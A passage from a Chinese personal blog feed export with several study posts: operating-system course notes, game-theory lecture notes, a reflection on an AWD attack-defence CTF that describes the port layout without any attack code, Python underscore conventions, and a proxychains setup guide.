title="优缺点"></a>优缺点</h4><ul><li>资源利用率高</li><li>吞吐量大</li><li>平均周转时间长</li><li>没有交互能力</li></ul><p>==操作系统定义为:一组能有效组织和管理硬件和软件资源，合理进行调度，方便用户使用程序的集合==</p><h3 id="分时系统（The-Sharing-System）"><a href="#分时系统（The-Sharing-System）" class="headerlink" title="分时系统（The Sharing System）"></a>分时系统（The Sharing System）</h3><p>在一台主机上连接多个终端，允许多个用户同时通过终端以交互方式使用计算机，共享主机资源</p><h4 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h4><ul><li>多路性</li><li>独立性</li><li>及时性</li><li>交互性</li></ul><h2 id="基本特性"><a href="#基本特性" class="headerlink" title="基本特性"></a>基本特性</h2><p><strong>有并发，共享，虚拟，异步四个基本特征</strong></p><h3 id="并行与并发"><a href="#并行与并发" class="headerlink" title="并行与并发"></a>并行与并发</h3><p>并行：多个程序同时执行</p><p>并发：分时交替执行（为主）</p><h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><p>指在系统中可以独立运行并且是资源分配的基本单元</p><h3 id="共享"><a href="#共享" class="headerlink" title="共享"></a>共享</h3><p>互斥共享方式和同时访问方式</p><h3 id="虚拟"><a href="#虚拟" class="headerlink" title="虚拟"></a>虚拟</h3><p>（没有那么多但感觉有那么多）</p><ul><li>时分复用技术    （空闲时给其他用户服务</li><li>空分复用技术    （储存器空闲时存储和运行程序</li></ul><h3 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h3><p>（同时开始，不同时结束）</p><p>进程以不可预知的速度进行</p><h2 id="存储器管理功能"><a href="#存储器管理功能" class="headerlink" title="存储器管理功能"></a>存储器管理功能</h2><ul><li>内存分配</li><li>内存保护</li><li>地址映射</li><li>内存扩充</li></ul><h2 id="OS结构设计"><a href="#OS结构设计" class="headerlink" title="OS结构设计"></a>OS结构设计</h2><p>第一代无结构OS，第二代模块化OS，第三代分层式OS</p><h1 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h1><h2 id="进程-1"><a href="#进程-1" class="headerlink" title="进程"></a>进程</h2><p>PCB进程控制块（Process Control Block）</p><p>定义：</p><ul><li>进程的程序的一次执行</li><li>进程是一个程序及其数据 顺序执行的活动</li><li>进程是系统进行资源分配的独立单元</li></ul><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><ul><li>动态性</li><li>并发性</li><li>独立性</li><li>异步性</li></ul><h2 id="进程状态转换"><a href="#进程状态转换" class="headerlink" title="进程状态转换"></a>进程状态转换</h2><p>==P42-43==</p><h2 id="操作系统内核"><a href="#操作系统内核" class="headerlink" title="操作系统内核"></a>操作系统内核</h2><p>处理机两种执行状态：系统态和用户态</p><h2 id="进程同步"><a href="#进程同步" class="headerlink" title="进程同步"></a>进程同步</h2><h3 id="临界资源-生产者消费者问题"><a href="#临界资源-生产者消费者问题" class="headerlink" title="临界资源-生产者消费者问题"></a>临界资源-生产者消费者问题</h3><h3 id="设置临界区"><a href="#设置临界区" class="headerlink" title="设置临界区"></a>设置临界区</h3><ul><li>进入区 判断资源是否被访问</li><li>临界区</li><li>退出区 将正被访问标志恢复为未被访问</li><li>剩余区</li></ul><h3 id="同步规则"><a href="#同步规则" class="headerlink" title="同步规则"></a>同步规则</h3><ul><li>空闲让进</li><li>忙则等待</li><li>有限等待 有限时间内能访问</li><li>让权等待 不能进入则释放处理机</li></ul><h2 id="利用信号量实现进程互斥"><a href="#利用信号量实现进程互斥" class="headerlink" title="利用信号量实现进程互斥"></a>利用信号量实现进程互斥</h2><p>设mutex为互斥信号量，=1都未进入临界区，=0有一个进入运行，另一阻塞。= -1有一正在运行，另一等待。</p><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>调度和分派的基本单位，能独立运行的基本单位</p><p>切换时仅保存和设置少量寄存器内容，切换代价远低于进程</p><h1 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h1><h2 id="处理机调度层次"><a href="#处理机调度层次" class="headerlink" title="处理机调度层次"></a>处理机调度层次</h2><h3 id="高级调度"><a href="#高级调度" class="headerlink" title="高级调度"></a>高级调度</h3><p>调度对象是作业，多用于多道批处理</p><h3 id="低级调度"><a href="#低级调度" class="headerlink" title="低级调度"></a>低级调度</h3><p>决定就绪队列哪个进程获得处理机</p><h3 id="中级调度"><a href="#中级调度" class="headerlink" title="中级调度"></a>中级调度</h3><p>提高内存利用率和系统吞吐量（把暂时不运行的进程调至外存，此时进程状态为就绪/挂起状态）</p><h2 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h2><h3 id="CPU利用率"><a href="#CPU利用率" class="headerlink" title="CPU利用率"></a>CPU利用率</h3><p>CPU利用率 = CPU有效工作时间/(CPU有效工作时间 + CPU空闲等待时间)</p><h3 id="平均周转时间"><a href="#平均周转时间" class="headerlink" title="平均周转时间"></a>平均周转时间</h3><p>T = 1/n(T1+T2 ······ +Tn)</p><h3 id="平均带权周转时间"><a href="#平均带权周转时间" class="headerlink" title="平均带权周转时间"></a>平均带权周转时间</h3><p>W = 1/n(作业周转时间Ti/提供服务Ts + ······ ) i=1,2,3,4…..</p><h3 id="系统吞吐量大"><a href="#系统吞吐量大" class="headerlink" title="系统吞吐量大"></a>系统吞吐量大</h3><p>与作业平均长度有关，单纯提高吞吐量可选择多的短作业运行</p><h2 id="分时系统目标"><a href="#分时系统目标" class="headerlink" title="分时系统目标"></a>分时系统目标</h2><ul><li>响应时间快</li><li>均衡性（相应快慢和请求的复杂性相适应）</li></ul><h2 id="实时系统目标"><a href="#实时系统目标" class="headerlink" title="实时系统目标"></a>实时系统目标</h2><ul><li>截止时间的保证</li><li>可预测性</li></ul><h2 id="作业调度算法"><a href="#作业调度算法" class="headerlink" title="作业调度算法"></a>作业调度算法</h2><h3 id="FCFS（First-Come-First-Server）先来先服务"><a href="#FCFS（First-Come-First-Server）先来先服务" class="headerlink" title="FCFS（First Come First Server）先来先服务"></a>FCFS（First Come First Server）先来先服务</h3><h3 id="SJF-Short-Job-First-短作业优先"><a href="#SJF-Short-Job-First-短作业优先" class="headerlink" title="SJF (Short Job First) 短作业优先"></a>SJF (Short Job First) 短作业优先</h3><h3 id="PSA-Priority-Scheduling-Algorithm-优先级调度算法"><a href="#PSA-Priority-Scheduling-Algorithm-优先级调度算法" class="headerlink" title="PSA (Priority-Scheduling Algorithm) 优先级调度算法"></a>PSA (Priority-Scheduling Algorithm) 优先级调度算法</h3><p>基于作业紧迫程度</p><h3 id="HRRN-Highest-Response-Ratio-Next-高响应比优先调度算法"><a href="#HRRN-Highest-Response-Ratio-Next-高响应比优先调度算法" class="headerlink" title="HRRN (Highest Response Ratio Next) 高响应比优先调度算法"></a>HRRN (Highest Response Ratio Next) 高响应比优先调度算法</h3><p>优先权 = (等待时间 + 要求服务时间) / 要求服务时间</p><h3 id="RR-Round-Robin-基于时间片的轮转调度算法"><a href="#RR-Round-Robin-基于时间片的轮转调度算法" class="headerlink" title="RR ( Round Robin) 基于时间片的轮转调度算法"></a>RR ( Round Robin) 基于时间片的轮转调度算法</h3><h3 id="EDF-Earliest-Deadline-First-最早截止时间优先算法"><a href="#EDF-Earliest-Deadline-First-最早截止时间优先算法" class="headerlink" title="EDF (Earliest Deadline First) 最早截止时间优先算法"></a>EDF (Earliest Deadline First) 最早截止时间优先算法</h3><h3 id="LLF-Least-Laxity-First-最低松弛度算法"><a href="#LLF-Least-Laxity-First-最低松弛度算法" class="headerlink" title="LLF (Least Laxity First) 最低松弛度算法"></a>LLF (Least Laxity First) 最低松弛度算法</h3><p>松弛度 = (必须完成时间 - 本身运行时间 - 当前时间)</p><h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>一组进程中每一个进程都在等待只有其他进程才能引发的时间</p><h3 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h3><ul><li>互斥条件</li><li>请求和保持条件</li><li>不可抢占条件</li><li>循环等待条件</li></ul><h2 id="银行家算法-P121"><a href="#银行家算法-P121" class="headerlink" title="银行家算法 P121"></a>银行家算法 P121</h2><p>判断 需求是否小于等于需要的</p><p>判断 需要是否小于等于可用的</p><p>模拟分配并检测是否有安全序列</p><h1 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h1><h2 id="磁盘缓存"><a href="#磁盘缓存" class="headerlink" title="磁盘缓存"></a>磁盘缓存</h2><p>在内存中暂存磁盘中读出的数据</p><h2 id="固定分区分配"><a href="#固定分区分配" class="headerlink" title="固定分区分配"></a>固定分区分配</h2><ul><li><p>相等 </p></li><li><p>不相等 建立表，记录分区信息</p></li></ul><h2 id="动态分区分配"><a href="#动态分区分配" class="headerlink" title="动态分区分配"></a>动态分区分配</h2><p>常见数据结构:</p><ul><li>空闲分区链</li><li>空闲分区表</li></ul><h2 id="空闲分区分配算法"><a href="#空闲分区分配算法" class="headerlink" title="空闲分区分配算法"></a>空闲分区分配算法</h2><h3 id="FF-First-Fit-首次适应"><a href="#FF-First-Fit-首次适应" class="headerlink" title="FF (First Fit) 首次适应"></a>FF (First Fit) 首次适应</h3><p>从头找，找到空间再划分内存给作业</p><h3 id="NF-Next-fit-循环首次适应"><a href="#NF-Next-fit-循环首次适应" class="headerlink" title="NF (Next fit) 循环首次适应"></a>NF (Next fit) 循环首次适应</h3><p>从上一次查找到的空闲区的下一个开始查找</p><h3 id="BF-Best-Fit-最佳适应算法"><a href="#BF-Best-Fit-最佳适应算法" class="headerlink" title="BF (Best Fit) 最佳适应算法"></a>BF (Best Fit) 最佳适应算法</h3><p>把能满足要求、最小的空闲区分配，但碎片很多</p><h3 id="WF-Worst-Fit-最坏适应算法"><a href="#WF-Worst-Fit-最坏适应算法" class="headerlink" title="WF (Worst Fit)最坏适应算法"></a>WF (Worst Fit)最坏适应算法</h3><p>总挑选最大的空闲区进行分配</p><p>优点 剩下的空闲区不至于太小 查找效率高</p><h2 id="分页储存"><a href="#分页储存" class="headerlink" title="分页储存"></a>分页储存</h2><h3 id="分页储存-1"><a href="#分页储存-1" class="headerlink" title="分页储存"></a>分页储存</h3><h4 id="页面和物理块"><a href="#页面和物理块" class="headerlink" title="页面和物理块"></a>页面和物理块</h4><p>用户程序的地址空间分为若干区域，成为页。</p><p>内存中同样划分，成为块</p><p>地址结构：</p><p>高20位 页号 低12位 位偏移量</p><h4 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h4><p>记录页在内存中对应的物理块号</p><h2 id="分段管理"><a href="#分段管理" class="headerlink" title="分段管理"></a>分段管理</h2><p>编程需要：</p><ul><li>信息共享</li><li>信息保护</li><li>动态增长</li><li>动态链接</li></ul><p>作业地址被分为多个段，所以呈现出二维特性</p><p>分段地址：</p><p>高16位 段号 低16位 段内地址</p><h3 id="段表"><a href="#段表" class="headerlink" title="段表"></a>段表</h3><p>各个段离散的放入内存不同分区中，需要为每个进程建立段映射表</p><p>实现从逻辑段到物理内存区的映射</p><h1 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h1><h2 id="虚拟存储器定义"><a href="#虚拟存储器定义" class="headerlink" title="虚拟存储器定义"></a>虚拟存储器定义</h2><p>具有请求调入和置换功能，从逻辑上对内存扩充的存储器系统</p><h2 id="特征-1"><a href="#特征-1" class="headerlink" title="特征"></a>特征</h2><ul><li>多次性    分多次装入内存</li><li>对换性</li><li>虚拟性</li></ul><h2 id="页面置换算法"><a href="#页面置换算法" class="headerlink" title="页面置换算法"></a>页面置换算法</h2><h3 id="Optimal-最佳置换算法"><a href="#Optimal-最佳置换算法" class="headerlink" title="Optimal 最佳置换算法"></a>Optimal 最佳置换算法</h3><p>预测最久不使用的页并进行替换。</p><h3 id="FIFO-先进先出页面置换算法"><a href="#FIFO-先进先出页面置换算法" class="headerlink" title="FIFO 先进先出页面置换算法"></a>FIFO 先进先出页面置换算法</h3><p>总淘汰最先进入的（驻留最久的）</p><h3 id="LRU-Least-Recent-Used-最近最久未使用"><a href="#LRU-Least-Recent-Used-最近最久未使用" class="headerlink" title="LRU (Least Recent Used) 最近最久未使用"></a>LRU (Least Recent Used) 最近最久未使用</h3><p>选择最近最久未使用的页面</p><p>LRU和OPT，加物理块数不会增加缺页次数，FIFO不一定能减少缺页次数</p><h2 id="抖动"><a href="#抖动" class="headerlink" title="抖动"></a>抖动</h2><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>运行的进程太多，频繁出新缺页，进程大部分时间都用于页面的换进换出</p><h3 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h3><ul><li>局部置换策略    只在分配给自己的内存中置换</li></ul><h2 id="请求分段储存管理"><a href="#请求分段储存管理" class="headerlink" title="请求分段储存管理"></a>请求分段储存管理</h2><h3 id="共享段表"><a href="#共享段表" class="headerlink" title="共享段表"></a>共享段表</h3><h3 id="分段保护"><a href="#分段保护" class="headerlink" title="分段保护"></a>分段保护</h3><ul><li>越界检查</li><li>存取控制检查</li><li>环保护机构 类似系统的内核等级</li></ul><h1 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h1><h2 id="I-O基本功能"><a href="#I-O基本功能" class="headerlink" title="I/O基本功能"></a>I/O基本功能</h2><ul><li>方便用户使用</li><li>提高CPU和IO设备利用率</li><li>共享设备时提供方便</li></ul><h2 id="中断处理程序"><a href="#中断处理程序" class="headerlink" title="中断处理程序"></a>中断处理程序</h2><ul><li>测定是否有未响应的中断信号</li><li>保护被中断进程的CPU环境</li><li>转入相应的设备处理程序</li><li>中断处理</li><li>恢复CPU现场并退出中断</li></ul><p>图p206</p><h2 id="DMA控制器"><a href="#DMA控制器" class="headerlink" title="DMA控制器"></a>DMA控制器</h2><h3 id="主机-控制器接口"><a href="#主机-控制器接口" class="headerlink" title="主机-控制器接口"></a>主机-控制器接口</h3><ul><li>DR 数据寄存器</li><li>MAR 内存地址寄存器</li><li>DC 数据计数器</li><li>CR 命令/状态寄存器</li></ul><p>DC，MAR，CR获得从CPU传来的数据和命令，DR获取数据，并传入MAR</p><p>设置MAR和DC初值 -&gt; 启动DMA -&gt; 使用存储器周期传送数据 -&gt; 存储器地址+1，DC-1 -&gt; 循环</p><p>若DC = 0 请求中断</p><h2 id="与设备无关IO"><a href="#与设备无关IO" class="headerlink" title="与设备无关IO"></a>与设备无关IO</h2><ul><li>以物理设备名使用设备     不灵活，利用率也不高</li><li>逻辑设备名 </li></ul><h3 id="设备控制表DCT"><a href="#设备控制表DCT" class="headerlink" title="设备控制表DCT"></a>设备控制表DCT</h3><ul><li>设备类型</li><li>设备标志符</li><li>设备状态</li><li>指向控制器表的指针</li><li>重复执行次数或时间</li><li>设备队列的队首指针</li></ul><h3 id="控制器控制表COCT"><a href="#控制器控制表COCT" class="headerlink" title="控制器控制表COCT"></a>控制器控制表COCT</h3><p>记录控制器情况</p><h3 id="LUT-Logical-Unit-Table-逻辑设备表"><a href="#LUT-Logical-Unit-Table-逻辑设备表" class="headerlink" title="LUT (Logical Unit Table) 逻辑设备表"></a>LUT (Logical Unit Table) 逻辑设备表</h3><p>逻辑设备名 | 物理设备名 | 驱动程序入口地址</p><p>/dev/tty      |  3                |  1024</p><p>逻辑设备表 | 系统设备表指针</p><p>/dev/tty.     |    3</p><h2 id="缓冲"><a href="#缓冲" class="headerlink" title="缓冲"></a>缓冲</h2><p>CPU和IO设备速度不匹配</p><p>利用缓冲寄存器暂存数据</p><h2 id="磁盘调度算法"><a href="#磁盘调度算法" class="headerlink" title="磁盘调度算法"></a>磁盘调度算法</h2><h3 id="FCFS"><a href="#FCFS" class="headerlink" title="FCFS"></a>FCFS</h3><h3 id="SSTF-Shortest-Search-Time-First-最短寻道时间优先"><a href="#SSTF-Shortest-Search-Time-First-最短寻道时间优先" class="headerlink" title="SSTF (Shortest Search Time First) 最短寻道时间优先"></a>SSTF (Shortest Search Time First) 最短寻道时间优先</h3><h2 id="基于扫描的磁盘调度"><a href="#基于扫描的磁盘调度" class="headerlink" title="基于扫描的磁盘调度"></a>基于扫描的磁盘调度</h2><h3 id="SCAN-扫描算法-又称电梯调度算法"><a href="#SCAN-扫描算法-又称电梯调度算法" class="headerlink" title="SCAN 扫描算法 又称电梯调度算法"></a>SCAN 扫描算法 又称电梯调度算法</h3><p>要访问的磁道与刺头当前距离较近</p><h1 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h1><h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>文件逻辑结构</p><p>文件由一系列逻辑记录组成，是可以直接处理的数据及其结构，独立于文件的物理特性，又称文件组织</p><p>物理结构</p><h1 id="第八章"><a href="#第八章" class="headerlink" title="第八章"></a>第八章</h1><p>对磁盘管理器的要求</p><ul><li>有效地利用存储空间</li><li>提高磁盘IO速率</li><li>提高磁盘系统可靠性</li></ul><p>外存组织方式</p><ul><li>连续</li><li>链接</li><li>索引</li></ul><h2 id="链接组织方式"><a href="#链接组织方式" class="headerlink" title="链接组织方式"></a>链接组织方式</h2><p>显式 表中放指针，链表、隐式 链表</p><h2 id="FAT"><a href="#FAT" class="headerlink" title="FAT"></a>FAT</h2><p>分成卷</p><p>一个磁盘可多个卷，一个卷可由多个磁盘组成</p><p>文件第一个盘号放在FCB中，FAT每个表项最后放下一个盘块号</p><h3 id="簇"><a href="#簇" class="headerlink" title="簇"></a>簇</h3><p>是一组相邻的上去，作为虚拟扇区。盘块分配时以簇为基本单位</p><p>好处：能适应磁盘容量不断增大的情况，还可减少FAT表中项数</p><h2 id="文件储存空间管理"><a href="#文件储存空间管理" class="headerlink" title="文件储存空间管理"></a>文件储存空间管理</h2><h3 id="空闲表法"><a href="#空闲表法" class="headerlink" title="空闲表法"></a>空闲表法</h3><p>给每个文件分配连续存储空间。</p><p>系统也会为外存空闲区建立空闲表</p><h3 id="位视图法"><a href="#位视图法" class="headerlink" title="位视图法"></a>位视图法</h3><p>二位数组模样，m*n=磁盘总块数</p>]]></content>
    
    
    <categories>
      
      <category>专业学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>专业学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博弈论</title>
    <link href="/2020/01/13/%E5%8D%9A%E5%BC%88%E8%AE%BA/"/>
    <url>/2020/01/13/%E5%8D%9A%E5%BC%88%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/av41333177?p=2" target="_blank" rel="noopener"><br>LINK</a><br>《博弈圣经》博弈论的定义：我们把动物利用大自然移动的瘾魂，在决策人期待的空间里，形成三维均衡的学术理论，称为博弈论。<br>基本概念中包括局中人、行动、信息、策略、收益、均衡和结果等。其中局中人、策略和收益是最基本要素。局中人、行动和结果被统称为博弈规则。</p><h2 id="Class1"><a href="#Class1" class="headerlink" title="Class1"></a>Class1</h2><p><strong><em>定义：如果一个选项得到的结果严格优于另一个选项，那么称这个选项为严格优势策略。\</em></strong></p><p><strong>结论1：不要选择严格劣势策略</strong></p><p><strong>结论2：理性的选择，使得总结果变得更坏</strong></p><p>改变收益，就会改变目的。</p><p><strong><em>结论3：予欲得之，必先知之\</em></strong></p><p>结论4：分析他们（对手）的收益，站在别人的立场上去分析他们会怎么做</p><blockquote><p>2019/8/6</p></blockquote><hr><h2 id="Class2"><a href="#Class2" class="headerlink" title="Class2"></a>Class2</h2><p>博弈的要素：参与人（i,j）、策略（si,Si策略集合，s某一次博弈）、收益（U，Ui(s)）</p><p>s-i:除了i以外其他参与人每人的策略</p><table><thead><tr><th align="left">1/2</th><th align="left">L</th><th align="left">C</th><th align="left">R</th></tr></thead><tbody><tr><td align="left">T</td><td align="left">5,-1</td><td align="left">11,3</td><td align="left">0,0</td></tr><tr><td align="left">B</td><td align="left">6,4</td><td align="left">0,2</td><td align="left">2,0</td></tr></tbody></table><p>S1={T,B} S2={L,C,R}</p><p>U1(T,C)=11 U2(T，C)=3</p><p>定义：参与人i的策略s’i严格劣于另一个策略si，在其他人选择s-i时，选择si的收益UI严格优于此情况下选择s’i的收益UI</p><table><thead><tr><th align="left">De/Attach</th><th align="left">ez</th><th align="left">hard</th></tr></thead><tbody><tr><td align="left">E</td><td align="left">1,1</td><td align="left">1,1</td></tr><tr><td align="left">H</td><td align="left">0,2</td><td align="left">2,0</td></tr></tbody></table><p><strong><em>定义：参与者i的策略s’i，弱劣于策略si当且仅当在对手选择s-i的情况下，参与人i选择si的收益等于对手选s-i下他选s’i的收益，而且在任何情况下均成立。除此之外，对手选s-i参与者的i的策略si，严格优于其他策略s’i，至少在某种情况下成立\</em></strong>（参与者i的策略s’i弱劣于策略si，当且仅当无论对手怎么做，他选择si的收益至少与选择s‘i的相等，有些情况甚至是严格占优的）</p><p>共同知识：我知道一个事情，你也知道这件事，我知道你知道，你知道我知道……</p><p>相互知识不是共同知识，共同知识定义很严格。</p><blockquote><p>2019/8/7</p></blockquote><hr><h2 id="Class-3"><a href="#Class-3" class="headerlink" title="Class 3"></a>Class 3</h2><p>迭代剔除劣势策略：揣测对手意图，揣测对手知道我们的意图</p><p>商业会集中获得附近客源</p><p>==第三竞选者如何影响选举结果?==</p><p>最佳对策：最大化预期收益</p><p><a href="https://i.loli.net/2019/08/10/g9hIt6PSRsxrcul.png" target="_blank" rel="noopener"><img src="%E5%8D%9A%E5%BC%88%E8%AE%BA.assets/g9hIt6PSRsxrcul.png" srcset="/img/loading.gif" alt="Class 3 画图"></a></p><p>画图用数据解释比较好</p><blockquote><p>2019/8/8</p></blockquote><hr><h2 id="Class4"><a href="#Class4" class="headerlink" title="Class4"></a>Class4</h2><table><thead><tr><th align="left">F/D</th><th align="left">L</th><th align="left">R</th></tr></thead><tbody><tr><td align="left">L</td><td align="left">4.-4</td><td align="left">9,-9</td></tr><tr><td align="left">M</td><td align="left">6,-6</td><td align="left">6,-6</td></tr><tr><td align="left">R</td><td align="left">9,-9</td><td align="left">4,-4</td></tr></tbody></table><p><a href="https://i.loli.net/2019/08/10/3XoNK7aLYSU5VTM.png" target="_blank" rel="noopener"><img src="%E5%8D%9A%E5%BC%88%E8%AE%BA.assets/3XoNK7aLYSU5VTM.png" srcset="/img/loading.gif" alt="Class4 另一种画图方法"></a></p><p>不要选择一个任何选择下都非最佳对策的策略。</p><p><strong><em>最佳对策：参与人i的策略Si，是一个最佳对策（BR），是对手的策略S-i的最佳对策。如果参与人i在对手的s-i策略下，选Si的收益弱优于对手的其他策略Si’\</em></strong></p><p><strong><em>最佳对策：Si满足所有情况中，最大化了对手选S-i时我的收益\</em></strong></p><p>合伙人：两个实体共同完成一个协作项目，并且平分利润</p><p>外部性：我的努力不仅对我有利，对你也有利</p><p>纳什均衡：没人想选择其他策略，在这个点，互相都采用的是最佳策略</p><blockquote><p>2019/8/9</p></blockquote><p><strong><em>未完待续\</em></strong></p>]]></content>
    
    
    <categories>
      
      <category>课外学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安洵杯线下AWD总结</title>
    <link href="/2020/01/13/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E6%80%BB%E7%BB%93/"/>
    <url>/2020/01/13/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="安洵杯线下AWD总结"><a href="#安洵杯线下AWD总结" class="headerlink" title="安洵杯线下AWD总结"></a>安洵杯线下AWD总结</h1><img src="2020/01/13/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E6%80%BB%E7%BB%93/image-20191210210716136.png" srcset="/img/loading.gif" class="" title="image-20191210210716136"><img src="2020/01/13/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E6%80%BB%E7%BB%93/95038C770B129D8AE642F53530CAB33B.jpg" srcset="/img/loading.gif" class="" title="img"><h2 id="事后BB"><a href="#事后BB" class="headerlink" title="事后BB"></a>事后BB</h2><p>==赛前自动提交flag脚本没有，自动化打全场脚本没有，哎。==</p><p>线下还是很友好的，可以连接外网，伙食也很不错，但是！</p><p><strong>只有先黑盒测试过了自己的，拿了flag并提交了之后，才可以找主办方要ssh密码=。=并且AWD只有1道pwn题，3个web题，域渗透部分就更不必多说了，都是web，哎</strong></p><h2 id="AWD规则"><a href="#AWD规则" class="headerlink" title="AWD规则"></a>AWD规则</h2><p>连接的是docker服务器，所以给的都是端口</p><p>端口列表：axx80/axx22 </p><ul><li>eg: team01-web1 10180(web) 10122(ssh) </li><li>eg: team18-web2 11880(web) 11822(ssh) </li><li>eg: team19-web3 30180(web) 30122(ssh) </li><li>eg: team01-pwn1 40180(pwn) 40122(ssh)</li></ul><p>==比如我拿到的pwn端口是40980，那么别人的就是4xx80，40080端口到41780端口，写打全场脚本就这样挨个端口打过去==</p><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>开局好久都是蒙蔽状态，不知道ip，不知道端口，<strong>但其实这些都在群里发的线下赛说明中包含有，需要注意去看QAQ</strong></p><p>有空了我就找找看看写写自动化提交和多进程打全场脚本QAQ</p><p>pwn的话，就专心做，打通了，自己的这边的话就修改一下栈的位置？挪一下栈什么的，打个patch就好了= =（当然我还没试过，慢慢学习.jpg）</p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p><a href="https://xz.aliyun.com/t/3607" target="_blank" rel="noopener">AWD二进制运维工具</a></p><p><a href="https://www.cnblogs.com/work115/p/5621789.html" target="_blank" rel="noopener">python之多进程</a>-因为听南梦说多线程容易崩</p><p><a href="https://www.cnblogs.com/xiao-apple36/p/9144092.html" target="_blank" rel="noopener">Python模块学习 - Paramiko</a></p><p>幸好新苗没中，可以专心搞pwn了哎</p><p>向南梦大佬学习，<a href="https://196011564.github.io/" target="_blank" rel="noopener">link</a></p>]]></content>
    
    
    <categories>
      
      <category>反思总结</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python中下划线的5种含义</title>
    <link href="/2020/01/13/Python%E4%B8%AD%E4%B8%8B%E5%88%92%E7%BA%BF%E7%9A%845%E7%A7%8D%E5%90%AB%E4%B9%89/"/>
    <url>/2020/01/13/Python%E4%B8%AD%E4%B8%8B%E5%88%92%E7%BA%BF%E7%9A%845%E7%A7%8D%E5%90%AB%E4%B9%89/</url>
    
    <content type="html"><![CDATA[<p>在用python重写算法，学习学习算法时，一时好奇（打基础）来学习了python的下划线</p><ul><li><p>单前导下划线：_var            小小警示，提示只在内部使用，非public和private那种</p></li><li><p>单末尾下划线：var_            解决命名冲突的问题</p></li><li><p>双前导下划线：__var          防止变量在子类中被重写，只能在类内访问</p></li><li><p>单下划线：_                        使用“_”来表示它只是一个临时值</p></li><li><p>双前导和末尾下划线：</p><pre><code>__var__</code></pre><p>这个感觉有点奇怪，一个是常见的类内init，另一个则是下面这种len的写法</p><p></p><pre><code class="python">class Linkedlist(object):    def __init__(self):        self.head = Node()        self.length = 0    def __len__(self):        return self.length</code></pre><p>当我在main里</p><pre><code class="python">def main():    L = Linkedlist()    L.append(3)    L.append(5)    print(&quot;链表长度&quot;,len(L))if __name__ == &#39;__main__&#39;:    main()</code></pre><p>这样也可以输出len来= =</p></li></ul><p>  学习的网站：</p><ul><li><a href="https://blog.csdn.net/tcx1992/article/details/80105645" target="_blank" rel="noopener">https://blog.csdn.net/tcx1992/article/details/80105645</a></li><li><a href="https://blog.csdn.net/zhangvalue/article/details/93606688" target="_blank" rel="noopener">https://blog.csdn.net/zhangvalue/article/details/93606688</a></li></ul><p>  感觉跟着一步步测试下来更会用，但想完全知道怎么来的估计得去翻文档www</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
      <category>学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Proxychains</title>
    <link href="/2020/01/13/Proxychains/"/>
    <url>/2020/01/13/Proxychains/</url>
    
    <content type="html"><![CDATA[<p>折腾两小时，不如问一下人= =</p><p>Proxychains</p><p>先安装</p><p>然后sudo vi /etc/proxychains.conf</p><p>socks5 win_ip 1080</p><p>win_ip为你的windows主机ip，可在cmd ifconfig查看</p><p>飞机要打开允许局域网连接</p><img src="2020/01/13/Proxychains/image-20200110135926592.png" srcset="/img/loading.gif" class="" title="image-20200110135926592"><p>然后运行测试</p><p>proxychains4 telnet <a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a> 443</p><p>可以之后就可以直接sudo proxychains4 apt-get update了</p>]]></content>
    
    
    <categories>
      
      <category>Linux使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux 问题解决</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HCNP-SEC-19.11.23</title>
    <link href="/2020/01/13/HCNP-SEC-19.11.23/"/>
    <url>/2020/01/13/HCNP-SEC-19.11.23/</url>
    
